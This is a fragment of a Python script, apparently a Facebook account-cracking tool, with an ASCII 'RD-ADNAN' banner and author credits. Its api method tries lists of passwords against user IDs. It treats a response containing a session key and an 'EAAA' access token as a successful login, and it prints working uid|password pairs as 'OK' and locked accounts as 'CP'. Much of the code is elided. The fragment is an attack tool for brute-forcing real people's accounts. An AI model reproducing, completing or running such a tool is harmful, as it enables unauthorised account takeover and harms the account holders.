...
7MM"""Yp, `7MM"""Yb.            db      `7MM"""Yb. `7MN.   `7MF'     db      `7MN.   `7MF'

  MM    Yb   MM    `Yb.         ;MM:       MM    `Yb. MMN.    M      ;MM:       MMN.    M  

  MM    dP   MM     `Mb        ,V^MM.      MM     `Mb M YMb   M     ,V^MM.      M YMb   M  

  MM"""bg.   MM      MM       ,M  `MM      MM      MM M  `MN. M    ,M  `MM      M  `MN. M  

  MM    `Y   MM     ,MP mmmmm AbmmmqMA     MM     ,MP M   `MM.M    AbmmmqMA     M   `MM.M  

  MM    ,9   MM    ,dP'      A'     VML    MM    ,dP' M     YMM   A'     VML    M     YMM  

.JMMmmmd9  .JMMmmmdP'      .AMA.   .AMMA..JMMmmmdP' .JML.    YM .AMA.   .AMMA..JML.    YM 

\033[1;90m══════════════════════════════════════════════════

\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : ADNAN WASIF

\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : [ ERROR ]

\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : ADNAN404-CYBER
...
\033[1;90m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s[>_] [ADNAN] : %s/%s -> \033[0;92m [ ADNAN-OK:%s ]- \033[0;91m[ADNAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;92m   [ADNAN-OK] %s | %s\033[0;97m         "%(uid, pw))
				...
				print("\r  \033[0;91m   [ADNAN-CP] %s | %s\033[0;97m         "%(uid, pw))
